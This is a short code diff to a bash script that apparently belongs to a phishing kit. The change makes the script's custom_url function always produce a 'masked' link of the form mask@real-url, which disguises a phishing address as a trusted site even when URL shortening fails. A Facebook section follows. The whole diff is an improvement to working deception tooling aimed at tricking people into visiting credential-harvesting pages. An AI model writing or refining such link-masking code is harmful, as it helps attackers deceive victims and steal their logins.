@@ -499,13 +499,14 @@ custom_url() {
 			shorten $tinyurl "$url"
 		fi
 
-		url="https://$url"
+		raw_url="$url"
+		url="https://$raw_url"
 		if [[ $processed_url != "" ]]; then
 			masked_url="$mask@$processed_url"
 			processed_url="https://$processed_url"
 		else
 			processed_url="Unable to Short URL"
-			masked_url="Unable to generate masked link"
+			masked_url="$mask@$raw_url"
 		fi
 	else
 		# echo "[!] No url provided / Regex Not Matched"
@@ -515,7 +516,7 @@ custom_url() {
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
